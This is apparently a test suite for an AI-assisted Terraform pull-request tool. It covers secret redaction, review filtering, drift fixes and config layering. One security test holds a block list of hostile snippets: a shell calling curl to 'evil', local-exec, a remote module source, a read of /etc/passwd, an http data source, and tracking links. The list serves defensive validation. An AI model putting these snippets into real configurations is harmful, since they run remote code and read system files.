import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { readFileSync } from 'node:fs';
import {
  Ai, loadAiConfig, clean, planDigest, raiseRisk, applyEdits, checkPolicyDraft, projectFiles,
  type AiCall, type AiConfig, type PlanReview,
} from '../src/ai.ts';
import { parseCommand, helpText } from '../src/commands.ts';
import { aiLines } from '../src/render.ts';
import { planDriftFix, aiDriftFix, driftFixBody } from '../src/driftfix.ts';
import type { Run } from '../src/store.ts';

const fixture = (f: string) => readFileSync(join(import.meta.dirname, 'fixtures', f), 'utf-8');
const cfg: AiConfig = { provider: 'anthropic', model: 'claude-opus-5-5', effort: 'medium', features: ['review', 'fix', 'drift', 'policy', 'ask'], timeoutMs: 1000 };

// A fake Claude that answers every request with `answer` and records what was sent.
const fake = (answer: unknown, stop = 'end_turn') => {
  const sent: any[] = [];
  const call: AiCall = async (params) => {
    sent.push(params);
    return { id: 'm', type: 'message', role: 'assistant', model: params.model, content: [{ type: 'text', text: JSON.stringify(answer) }], stop_reason: stop, stop_details: null, usage: { input_tokens: 1, output_tokens: 1 } } as any;
  };
  return { call, sent };
};

test('config: off by default; provider, effort and features are checked', () => {
  assert.equal(loadAiConfig({}), undefined);
  assert.equal(loadAiConfig({ TERIAC_AI_PROVIDER: 'off' }), undefined);
  const c = loadAiConfig({ TERIAC_AI_PROVIDER: 'anthropic' })!;
  assert.deepEqual([c.model, c.effort, c.features.length], ['claude-opus-5-5', 'medium', 6]);
  assert.equal(loadAiConfig({ TERIAC_AI_PROVIDER: 'bedrock', AWS_REGION: 'eu-west-1' })!.model, 'anthropic.claude-opus-5-5');
  assert.deepEqual(loadAiConfig({ TERIAC_AI_PROVIDER: 'anthropic', TERIAC_AI_FEATURES: 'review, ask' })!.features, ['review', 'ask']);
  assert.throws(() => loadAiConfig({ TERIAC_AI_PROVIDER: 'openai' }), /must be one of anthropic, bedrock, vertex, foundry/);
  assert.throws(() => loadAiConfig({ TERIAC_AI_PROVIDER: 'anthropic', TERIAC_AI_FEATURES: 'review,approve' }), /unknown feature "approve"/);
  assert.throws(() => loadAiConfig({ TERIAC_AI_PROVIDER: 'anthropic', TERIAC_AI_EFFORT: 'huge' }), /TERIAC_AI_EFFORT/);
  assert.throws(() => loadAiConfig({ TERIAC_AI_PROVIDER: 'bedrock' }), /AWS_REGION/);
  assert.throws(() => loadAiConfig({ TERIAC_AI_PROVIDER: 'vertex' }), /ANTHROPIC_VERTEX_PROJECT_ID/);
});

test('cleaning: sensitive values and secrets never reach the request', async () => {
  const plan = JSON.parse(fixture('plan-sensitive.json'));
  assert.ok(planDigest(plan).includes('hunter2-SUPERSECRET'), 'the raw digest has it');
  const { call, sent } = fake({ summary: 'Raises replicas to 3.', findings: [] });
  const ai = new Ai(cfg, { call });
  const r = await ai.reviewPlan({ project: 'db', production: false, engine: 'terraform 1.9.8', plan, risk: null, findings: [] });
  assert.equal(r?.summary, 'Raises replicas to 3.');
  const body = JSON.stringify(sent[0]);
  assert.ok(!body.includes('hunter2-SUPERSECRET'));
  assert.ok(body.includes('(sensitive value)'));
  assert.equal(clean('key AKIAABCDEFGHIJKLMNOP here'), 'key ‹redacted: aws-access-key› here');
});

test('review: findings are kept tidy, and risk only goes up', async () => {
  const plan = JSON.parse(fixture('plan-changes.json'));
  const { call, sent } = fake({ summary: 'x', findings: [
    { address: 'terraform_data.database', severity: 'critical', title: 'Data loss', why: 'replaced' },
    { address: 'terraform_data.cdn', severity: 'low', title: 'New CDN', why: 'fine' },
  ] });
  const r = (await new Ai(cfg, { call }).reviewPlan({ project: 'p', production: true, engine: 'tf', plan, risk: { level: 'medium', reasons: ['changes production'] }, findings: [] }))!;
  assert.equal(r.findings.length, 2);
  assert.match(JSON.stringify(sent[0]), /\(production\)/);
  assert.deepEqual(raiseRisk({ level: 'medium', reasons: ['a'] }, r), { level: 'critical', reasons: ['a', 'AI review: Data loss'] });
  const calm: PlanReview = { kind: 'review', model: 'm', summary: '', findings: [{ address: 'x', severity: 'low', title: 't', why: 'w' }] };
  assert.deepEqual(raiseRisk({ level: 'high', reasons: [] }, calm), { level: 'high', reasons: [] }, 'never lowers, low adds nothing');
  assert.equal(raiseRisk(null, r), null, 'no changes stays no risk');
});

test('a declined or failed request means no AI help, not an error', async () => {
  const declined = fake({}, 'refusal');
  assert.equal(await new Ai(cfg, { call: declined.call }).draftPolicy('anything'), null);
  const broken: AiCall = async () => { throw new Error('529 overloaded'); };
  assert.equal(await new Ai(cfg, { call: broken }).explainFailure({ project: 'p', kind: 'plan', output: 'x', root: '/nope', dir: '.' }), null);
});

test('failure help: only fixes inside the project files and their lines survive', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'teriac-ai-'));
  mkdirSync(join(tmp, 'envs/dev'), { recursive: true });
  writeFileSync(join(tmp, 'envs/dev/broken.tf'), 'resource "terraform_data" "x" { input = var.missing }\n');
  writeFileSync(join(tmp, 'envs/dev/.terraform.lock.hcl'), 'lock');
  writeFileSync(join(tmp, 'secret.tf'), 'outside the project');
  try {
    assert.deepEqual(projectFiles(tmp, 'envs/dev').map(f => f.path), ['envs/dev/broken.tf']);
    const { call, sent } = fake({ cause: 'var.missing is not declared.', fixes: [
      { path: 'envs/dev/broken.tf', start_line: 1, end_line: 1, replacement: 'variable "missing" {}\nresource "terraform_data" "x" { input = var.missing }\n', why: 'declare it' },
      { path: 'secret.tf', start_line: 1, end_line: 1, replacement: 'x', why: 'outside' },
      { path: 'envs/dev/broken.tf', start_line: 5, end_line: 9, replacement: 'x', why: 'past the end' },
    ] });
    const r = (await new Ai(cfg, { call }).explainFailure({ project: 'envs/dev', kind: 'plan', output: fixture('plan-error.txt'), root: tmp, dir: 'envs/dev' }))!;
    assert.equal(r.cause, 'var.missing is not declared.');
    assert.deepEqual(r.fixes.map(f => [f.path, f.startLine, f.endLine]), [['envs/dev/broken.tf', 1, 1]]);
    assert.equal(r.fixes[0].replacement, 'variable "missing" {}\nresource "terraform_data" "x" { input = var.missing }', 'trailing newlines dropped');
    assert.match(JSON.stringify(sent[0]), /1\| resource/, 'files are sent with line numbers');
    assert.ok(!JSON.stringify(sent[0]).includes('outside the project'));
  } finally { rmSync(tmp, { recursive: true, force: true }); }
});

test('line edits: bottom first, overlaps and unknown files skipped', () => {
  const files = new Map([['a.tf', '1\n2\n3\n4\n5']]);
  const r = applyEdits(files, [
    { path: 'a.tf', startLine: 2, endLine: 3, replacement: 'two\nthree\nmore' },
    { path: 'a.tf', startLine: 3, endLine: 4, replacement: 'overlap' },
    { path: 'a.tf', startLine: 5, endLine: 5, replacement: 'five' },
    { path: 'b.tf', startLine: 1, endLine: 1, replacement: 'x' },
  ]);
  assert.equal(files.get('a.tf'), '1\ntwo\nthree\nmore\n4\nfive');
  assert.equal(r.applied.length, 2);
  assert.equal(r.skipped.length, 2);
});

test('policy drafts: rules are built and checked against their own tests', () => {
  const d = checkPolicyDraft({
    rules: [
      { name: 'no-public-buckets', description: 'Buckets stay private', severity: 'high', resource: 'aws_s3_bucket_public_access_block', projects: ['prod/**'], actions: [], kind: 'require', condition: { attribute: 'block_public_acls', op: 'equals', value_json: 'true' }, message: 'Block public access' },
      { name: 'bad', description: '', severity: 'low', resource: 'x', projects: [], actions: [], kind: 'deny_if', condition: { attribute: 'a', op: 'matches', value_json: 'not json' }, message: '' },
    ],
    tests: [
      { rule: 'no-public-buckets', resource_type: 'aws_s3_bucket_public_access_block', values_json: '{"block_public_acls": false}', should_fail: true, description: 'open bucket' },
      { rule: 'no-public-buckets', resource_type: 'aws_s3_bucket_public_access_block', values_json: '{"block_public_acls": true}', should_fail: false, description: 'closed bucket' },
      { rule: 'no-public-buckets', resource_type: 'aws_s3_bucket_public_access_block', values_json: '{"block_public_acls": true}', should_fail: true, description: 'a wrong test' },
      { rule: 'missing', resource_type: 'x', values_json: '{}', should_fail: true, description: '' },
    ],
    notes: '',
  });
  assert.deepEqual(d.rules.map(r => r.name), ['no-public-buckets']);
  assert.deepEqual(d.rules[0].require, { attribute: 'block_public_acls', equals: true });
  assert.deepEqual(d.rules[0].projects, ['prod/**']);
  assert.match(d.error!, /bad: the condition's value is not JSON/);
  assert.deepEqual(d.tests.map(t => t.passed), [true, true, false, false]);
  assert.equal(d.tests[3].error, 'no such rule');
});

test('teriac ask: needs the colon; free text, every line; listed in help when on', () => {
  const r = parseCommand('teriac ask: why is the subnet replaced?\nand is it safe?', ['teriac']);
  assert.ok(r?.ok);
  assert.equal(r.ok && r.command.question, 'why is the subnet replaced?\nand is it safe?');
  const at = parseCommand('@teriac ask:is it risky?', ['teriac']);
  assert.ok(at?.ok && at.command.question === 'is it risky?', 'no space after the colon is fine');
  const noColon = parseCommand('@teriac ask is it risky?', ['teriac']);
  assert.ok(noColon && !noColon.ok && /Put a colon after `ask`/.test(noColon.error));
  const empty = parseCommand('@teriac ask:', ['teriac']);
  assert.ok(empty && !empty.ok && /Ask a question after the colon/.test(empty.error));
  assert.match(helpText('teriac', false, true), /teriac ask: <question>/);
  assert.doesNotMatch(helpText('teriac', false, false), /ask/);
});

test('rendering: labelled as AI, reviews and fixes', () => {
  const run = (ai: Run['ai']) => ({ ai } as Run);
  const review = aiLines(run({ kind: 'review', model: 'claude-opus-5-5', summary: 'Replaces the DB.', findings: [{ address: 'aws_db_instance.main', severity: 'high', title: 'Data loss', why: 'No final snapshot.' }] })).join('\n');
  assert.match(review, /🤖 \*\*AI review\*\* <sub>claude-opus-5-5 · advisory, check it yourself<\/sub>/);
  assert.match(review, /> Replaces the DB\.\n- 🔴 \*\*Data loss\*\* · `aws_db_instance\.main` · No final snapshot\./);
  const fix = aiLines(run({ kind: 'fix', model: 'm', cause: 'Missing variable.', fixes: [{ path: 'main.tf', startLine: 3, endLine: 4, replacement: 'variable "x" {}', why: 'declare it' }] })).join('\n');
  assert.match(fix, /🤖 \*\*AI: why it failed\*\*/);
  assert.match(fix, /\*\*Suggested fix\*\* · `main\.tf` lines 3–4: declare it\n```hcl\nvariable "x" \{\}\n```/);
  assert.deepEqual(aiLines(run(null)), []);
});

test('drift: the AI adopts, reverts or leaves what the rules could not edit', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'teriac-ai-drift-'));
  mkdirSync(join(tmp, 'envs/prod'), { recursive: true });
  writeFileSync(join(tmp, 'envs/prod/main.tf'), [
    'resource "aws_instance" "web" {',
    '  instance_type = "t3.small"',
    '  tags = { Name = "web" }',
    '}',
    '',
    'resource "aws_security_group" "ssh" {',
    '  cidr = "10.0.0.0/8"',
    '}',
    '',
  ].join('\n'));
  try {
    const plan = { resource_drift: [
      { address: 'aws_instance.web', change: { actions: ['update'], before: { instance_type: 't3.small', tags: { Name: 'web' } }, after: { instance_type: 't3.large', tags: { Name: 'web', Team: 'core' } } } },
      { address: 'aws_security_group.ssh', change: { actions: ['update'], before: { cidr: ['10.0.0.0/8'] }, after: { cidr: ['0.0.0.0/0'] } } },
    ] };
    const fix = planDriftFix(tmp, 'envs/prod', plan);
    assert.equal(fix.edits.length, 1, 'instance_type is mechanical');
    const { call, sent } = fake({ decisions: [
      { address: 'aws_instance.web', decision: 'adopt', why: 'A team tag was added on purpose.', edits: [{ path: 'envs/prod/main.tf', start_line: 3, end_line: 3, replacement: '  tags = { Name = "web", Team = "core" }' }] },
      { address: 'aws_security_group.ssh', decision: 'revert', why: 'SSH opened to the internet.', edits: [{ path: 'envs/prod/main.tf', start_line: 7, end_line: 7, replacement: 'ignored' }] },
    ] });
    const out = await aiDriftFix(new Ai(cfg, { call }), tmp, 'envs/prod', 'envs/prod', plan, fix);
    const text = out.files.find(f => f.path === 'envs/prod/main.tf')!.content;
    assert.match(text, /instance_type = "t3\.large"/, 'the mechanical edit stays');
    assert.match(text, /tags = \{ Name = "web", Team = "core" \}/, 'the adopt edit is made');
    assert.match(text, /cidr = "10\.0\.0\.0\/8"/, 'a revert changes no code');
    assert.match(JSON.stringify(sent[0]), /t3\.large/, 'the AI sees the file after the mechanical edits');
    assert.equal(out.manual.length, 0, 'both were decided');
    const body = driftFixBody('envs/prod', 'main', out, 'nightly');
    assert.match(body, /\*\*🤖 Updated in code by AI\*\* <sub>claude-opus-5-5 · check each change<\/sub>\n- `aws_instance\.web`: A team tag was added on purpose\./);
    assert.match(body, /\*\*🤖 Left for applying back\*\*[^\n]*\n- `aws_security_group\.ssh`: SSH opened to the internet\./);
  } finally { rmSync(tmp, { recursive: true, force: true }); }
});

test('where AI is on: server, repo and project layers override; teriac.yaml only narrows', async () => {
  const { resolveAi, validateAiOverride } = await import('../src/ai.ts');
  assert.deepEqual(resolveAi(cfg, []), { features: cfg.features, model: 'claude-opus-5-5', effort: 'medium', review: 'push' });
  assert.equal(resolveAi(undefined, []), null, 'no provider: off everywhere');
  // Off by default, on for one project with fewer features, a cheaper model and more effort.
  const project = resolveAi(cfg, [{ enabled: false }, undefined, { enabled: true, features: ['review', 'fix'], model: 'claude-sonnet-5-5', effort: 'high' }]);
  assert.deepEqual(project, { features: ['review', 'fix'], model: 'claude-sonnet-5-5', effort: 'high', review: 'push' });
  assert.equal(resolveAi(cfg, [{ enabled: false }]), null);
  // The server's TERIAC_AI_FEATURES is the ceiling.
  assert.deepEqual(resolveAi({ ...cfg, features: ['review'] }, [{ features: ['review', 'ask'] }])?.features, ['review']);
  // teriac.yaml can't turn it on or change the model, only switch off or drop features.
  assert.equal(resolveAi(cfg, [{ enabled: false }], [{ enabled: true }]), null);
  assert.deepEqual(resolveAi(cfg, [], [{ features: ['review'], model: 'x' } as any]), { features: ['review'], model: 'claude-opus-5-5', effort: 'medium', review: 'push' });
  assert.equal(resolveAi(cfg, [], [{ enabled: false }]), null);
  // Bedrock model names get their prefix.
  assert.equal(resolveAi({ ...cfg, provider: 'bedrock', model: 'anthropic.claude-opus-5-5' }, [{ model: 'claude-sonnet-5-5' }])?.model, 'anthropic.claude-sonnet-5-5');
  assert.deepEqual(validateAiOverride(false, 'ai'), { enabled: false });
  assert.throws(() => validateAiOverride({ features: ['approve'] }, 'repos[0].ai'), /repos\[0\]\.ai\.features: unknown feature "approve"/);
  assert.throws(() => validateAiOverride({ model: '' }, 'ai'), /ai\.model must be a model name/);
  assert.throws(() => validateAiOverride({ budget: 3 }, 'ai'), /unknown setting "budget"/);
});

test('repos.yaml and teriac.yaml accept ai at every level', async () => {
  const { parseServerPolicy } = await import('../src/config.ts');
  const { parseRepoConfig } = await import('../src/repoConfig.ts');
  const p = parseServerPolicy('ai: { enabled: false }\nrepos:\n  - id: github.com/acme/*\n    ai: { effort: high }\n    projects:\n      - match: envs/prod\n        ai: { enabled: true, features: [review] }\n');
  assert.deepEqual(p.aiPolicy, { enabled: false });
  assert.deepEqual(p.repos[0].ai, { effort: 'high' });
  assert.deepEqual(p.repos[0].projects![0].ai, { enabled: true, features: ['review'] });
  assert.throws(() => parseServerPolicy('repos:\n  - id: a/*\n    projects:\n      - match: x\n        ai: { features: [nope] }\n'), /projects\[0\]\.ai\.features: unknown feature "nope"/);
  const r = parseRepoConfig('teriac.yaml', 'ai: { features: [review, fix] }\nprojects:\n  - dir: envs/dev\n    ai: false\n');
  assert.deepEqual(r.ai, { features: ['review', 'fix'] });
  assert.deepEqual(r.rules.find(x => x.match === 'envs/dev')?.ai, { enabled: false });
});

test('PR comment stays short: only important findings, no repeats, posted fixes become a pointer', () => {
  const run = (ai: Run['ai']) => ({ ai } as Run);
  const calm = run({ kind: 'review', model: 'm', summary: 'Adds a tag.', findings: [{ address: 'a', severity: 'low', title: 'Tag', why: 'fine' }] });
  assert.deepEqual(aiLines(calm, { brief: true }), [], 'nothing important: nothing in the PR');
  assert.match(aiLines(calm).join('\n'), /Adds a tag\./, 'the check run still has it');
  const many = run({ kind: 'review', model: 'm', summary: 's', findings: Array.from({ length: 8 }, (_, i) => ({ address: `r${i}`, severity: i < 7 ? 'high' as const : 'low' as const, title: `t${i}`, why: 'w' })) });
  const brief = aiLines(many, { brief: true }).join('\n');
  assert.equal((brief.match(/^- 🔴/gm) ?? []).length, 5);
  assert.match(brief, /3 more on the check run/);
  const posted = aiLines(run({ kind: 'fix', model: 'm', cause: 'Missing variable.', posted: true, fixes: [{ path: 'main.tf', startLine: 1, endLine: 1, replacement: 'x', why: 'y' }] }), { brief: true }).join('\n');
  assert.match(posted, /A suggested fix is on the code in \*\*Files changed\*\*/);
  assert.doesNotMatch(posted, /```hcl/);
});

test('season: the Christmas hat from 1 December to 6 January', async () => {
  const { christmas } = await import('../src/season.ts');
  assert.equal(christmas(new Date('2026-11-30T23:59:00Z')), false);
  assert.equal(christmas(new Date('2026-12-01T00:00:00Z')), true);
  assert.equal(christmas(new Date('2027-01-06T12:00:00Z')), true);
  assert.equal(christmas(new Date('2027-01-07T00:00:00Z')), false);
});

test('every provider gets model names it accepts, and refusals come with what to do', async () => {
  const { modelFor, aiErrorHint, label } = await import('../src/ai-config.ts');
  assert.equal(modelFor('bedrock', 'claude-sonnet-4-6'), 'anthropic.claude-sonnet-4-6');
  assert.equal(modelFor('bedrock', 'anthropic.claude-sonnet-4-6'), 'anthropic.claude-sonnet-4-6');
  assert.equal(modelFor('bedrock', 'us.anthropic.claude-sonnet-4-6'), 'us.anthropic.claude-sonnet-4-6', 'inference profiles are kept');
  assert.equal(modelFor('bedrock', 'global.anthropic.claude-opus-5-5'), 'global.anthropic.claude-opus-5-5');
  assert.equal(modelFor('bedrock', 'arn:aws:bedrock:us-east-1:1:application-inference-profile/abc'), 'arn:aws:bedrock:us-east-1:1:application-inference-profile/abc');
  assert.equal(modelFor('vertex', 'anthropic.claude-sonnet-4-6'), 'claude-sonnet-4-6');
  assert.equal(modelFor('anthropic', 'us.anthropic.claude-opus-5-5'), 'claude-opus-5-5');
  assert.equal(modelFor('foundry', 'my-claude-deployment'), 'my-claude-deployment', 'Foundry: the deployment name');
  assert.equal(loadAiConfig({ TERIAC_AI_PROVIDER: 'bedrock', AWS_REGION: 'us-east-1', TERIAC_AI_MODEL: 'claude-sonnet-4-6' })!.model, 'anthropic.claude-sonnet-4-6');
  assert.equal(label({ model: 'us.anthropic.claude-sonnet-4-6' }), 'claude-sonnet-4-6');
  assert.match(aiErrorHint('bedrock', 403, 'anthropic.claude-sonnet-5-5 is not available for this account.'), /holds this model back/);
  assert.match(aiErrorHint('bedrock', 400, 'Invocation with on-demand throughput isn’t supported. Retry with an inference profile'), /us\.anthropic/);
  assert.match(aiErrorHint('bedrock', 404, "The model 'x' does not exist"), /id from the Bedrock console/);
  assert.match(aiErrorHint('vertex', 404, 'not found'), /Model Garden/);
  assert.match(aiErrorHint('foundry', 404, 'deployment not found'), /deployment's name/);
  assert.match(aiErrorHint('anthropic', 400, 'Your credit balance is too low'), /no credits/);
  assert.match(aiErrorHint('anthropic', 401, 'invalid x-api-key'), /ANTHROPIC_API_KEY/);
});

test('a refused request is kept, with its hint, for the dashboard', async () => {
  const refused: AiCall = async () => { throw Object.assign(new Error('anthropic.claude-sonnet-5-5 is not available for this account.'), { status: 403 }); };
  const ai = new Ai({ ...cfg, provider: 'bedrock', model: 'anthropic.claude-sonnet-5-5' }, { call: refused });
  assert.equal(await ai.draftPolicy('x'), null);
  assert.equal(ai.lastError?.status, 403);
  assert.equal(ai.lastError?.model, 'claude-sonnet-5-5');
  assert.match(ai.lastError!.hint, /holds this model back/);
});

test('review timing: push, first or command; teriac.yaml can only make it rarer', async () => {
  const { resolveAi, validateAiOverride } = await import('../src/ai.ts');
  assert.equal(resolveAi(cfg, [])!.review, 'push');
  assert.equal(resolveAi(cfg, [{ review: 'first' }])!.review, 'first');
  assert.equal(resolveAi(cfg, [{ review: 'command' }, { review: 'push' }])!.review, 'push', 'a project rule can set it back');
  assert.equal(resolveAi(cfg, [{ review: 'first' }], [{ review: 'push' }])!.review, 'first', 'a repo cannot make it more often');
  assert.equal(resolveAi(cfg, [], [{ review: 'command' }])!.review, 'command', 'but can make it rarer');
  assert.throws(() => validateAiOverride({ review: 'daily' }, 'ai'), /ai\.review must be push/);
  const r = parseCommand('@teriac review -p envs/dev', ['teriac']);
  assert.ok(r?.ok && r.command.verb === 'review' && r.command.project === 'envs/dev');
  const bad = parseCommand('teriac review -t aws_s3_bucket.x', ['teriac']);
  assert.ok(bad && !bad.ok && /Only `-p`, `-d` and `-w` work with `teriac review`/.test(bad.error));
  assert.match(helpText('teriac', false, true), /teriac review/);
});

test('a review in the wrong shape, or about resources not in the plan, never reaches the PR', async () => {
  const plan = JSON.parse(fixture('plan-changes.json'));
  const wrong = fake({ cause: 'not a review', fixes: [] });
  assert.equal(await new Ai(cfg, { call: wrong.call }).reviewPlan({ project: 'p', production: false, engine: 'tf', plan, risk: null, findings: [] }), null);
  const invented = fake({ summary: 'One. Two. Three sentences is too many.', findings: [
    { address: 'aws_db_instance.not_in_plan', severity: 'critical', title: 'Made up', why: 'This resource is not in the plan.' },
    { address: '`terraform_data.database`', severity: 'high', title: 'Database replaced', why: 'Its data is lost. More words here.' },
    { address: 'terraform_data.database', severity: 'high', title: 'Database replaced', why: 'duplicate' },
  ] });
  const r = (await new Ai(cfg, { call: invented.call }).reviewPlan({ project: 'p', production: false, engine: 'tf', plan, risk: null, findings: [] }))!;
  assert.equal(r.summary, 'One. Two.', 'two sentences at most');
  assert.deepEqual(r.findings.map(f => [f.address, f.why]), [['terraform_data.database', 'Its data is lost.']]);
});

test('security: AI code that could run during a plan is refused; AI text cannot link, embed or ping', async () => {
  const { unsafeCode, safeText } = await import('../src/ai.ts');
  for (const bad of [
    'data "external" "x" { program = ["sh", "-c", "curl evil"] }',
    '  provisioner "local-exec" { command = "id" }',
    'module "m" { source = "git::https://evil/x" }',
    '  content = file("/etc/passwd")',
    '  value = templatefile("${path.module}/x", {})',
    'provider "aws" { region = "us-east-1" }',
    'terraform {\n  backend "s3" {}\n}',
    'data "http" "x" { url = "https://evil" }',
    Array(41).fill('x = 1').join('\n'),
  ]) assert.ok(unsafeCode(bad), `refused: ${bad.split('\n')[0]}`);
  for (const ok of ['variable "missing" {}\nresource "terraform_data" "x" { input = var.missing }', '  instance_type = "t3.large"', '  tags = { Team = "core" }']) {
    assert.equal(unsafeCode(ok), null, `allowed: ${ok}`);
  }
  assert.equal(safeText('See ![x](https://t.example/p.png) [docs](https://evil.example) <img src=x> and @alice'), 'See  docs  and @​alice');
  // A failure fix with unsafe code is dropped before it is suggested.
  const tmp = mkdtempSync(join(tmpdir(), 'teriac-ai-sec-'));
  writeFileSync(join(tmp, 'main.tf'), 'resource "terraform_data" "x" {}\n');
  try {
    const { call } = fake({ cause: 'x', fixes: [{ path: 'main.tf', start_line: 1, end_line: 1, replacement: 'data "external" "pwn" { program = ["sh"] }', why: 'trust me' }] });
    const r = await new Ai(cfg, { call }).explainFailure({ project: 'p', kind: 'plan', output: 'err', root: tmp, dir: '.' });
    assert.equal(r!.fixes.length, 0);
  } finally { rmSync(tmp, { recursive: true, force: true }); }
});

test('code review: diff lines are numbered; comments outside the diff, repeats and unsafe suggestions are dropped', async () => {
  const { diffLines } = await import('../src/ai.ts');
  const patch = '@@ -1,3 +1,4 @@\n resource "aws_s3_bucket" "b" {\n-  acl = "private"\n+  acl = "public-read"\n+  force_destroy = true\n }';
  const d = diffLines(patch);
  assert.deepEqual([...d.lines], [1, 2, 3, 4]);
  assert.match(d.view, /   2 \+   acl = "public-read"/);
  assert.match(d.view, /     -   acl = "private"/);
  const tmp = mkdtempSync(join(tmpdir(), 'teriac-ai-code-'));
  mkdirSync(join(tmp, 'live'), { recursive: true });
  writeFileSync(join(tmp, 'live/variables.tf'), 'variable "env" { default = "prod" }\n');
  try {
    const { call, sent } = fake({ comments: [
      { path: 'live/main.tf', line: 2, end_line: 2, severity: 'critical', title: 'Bucket made public', body: 'public-read exposes every object. Keep it private and serve through CloudFront.', suggestion: '  acl = "private"' },
      { path: 'live/main.tf', line: 2, end_line: 2, severity: 'high', title: 'Bucket made public', body: 'repeat', suggestion: '' },
      { path: 'live/main.tf', line: 9, end_line: 9, severity: 'high', title: 'Not in the diff', body: 'x', suggestion: '' },
      { path: 'live/main.tf', line: 3, end_line: 3, severity: 'medium', title: 'force_destroy on', body: 'A destroy would delete every object.', suggestion: '  provisioner "local-exec" { command = "x" }' },
      { path: 'other/x.tf', line: 1, end_line: 1, severity: 'high', title: 'Other file', body: 'x', suggestion: '' },
    ] });
    const r = (await new Ai(cfg, { call }).reviewCode({ project: 'live', production: true, diffs: [{ path: 'live/main.tf', patch }], root: tmp, dir: 'live' }))!;
    assert.deepEqual(r.map(c => [c.startLine, c.title, c.suggestion ?? null]), [[2, 'Bucket made public', '  acl = "private"'], [3, 'force_destroy on', null]], 'unsafe suggestion dropped, comment kept');
    const body = JSON.stringify(sent[0]);
    assert.match(body, /variable \\"env\\"/, 'the whole project is sent for context');
    assert.match(body, /\(production\)/);
  } finally { rmSync(tmp, { recursive: true, force: true }); }
});
